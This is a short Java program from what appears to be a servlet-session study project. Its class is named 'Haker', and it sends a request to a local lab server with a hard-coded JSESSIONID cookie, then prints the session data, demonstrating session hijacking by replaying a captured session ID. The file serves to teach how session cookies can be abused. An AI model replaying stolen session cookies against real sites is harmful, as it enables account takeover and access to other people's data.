package com.web.study.servlet.session;

import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Haker {
    public static void main(String[] args) throws Exception {
        String path = "http://192.168.1.24:8080/JavaWeb0829/servlet/session/read";
        URL url = new URL(path);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Cookie", "JSESSIONID=4AE8A5286285E7195026C95AA9B11F4E");
        conn.connect();
        InputStream is = conn.getInputStream();
        InputStreamReader isr = new InputStreamReader(is);
        char[] cbuf = new char[1];
        while (isr.read(cbuf) != -1) {            
            System.out.print(cbuf);
        }
    }
}
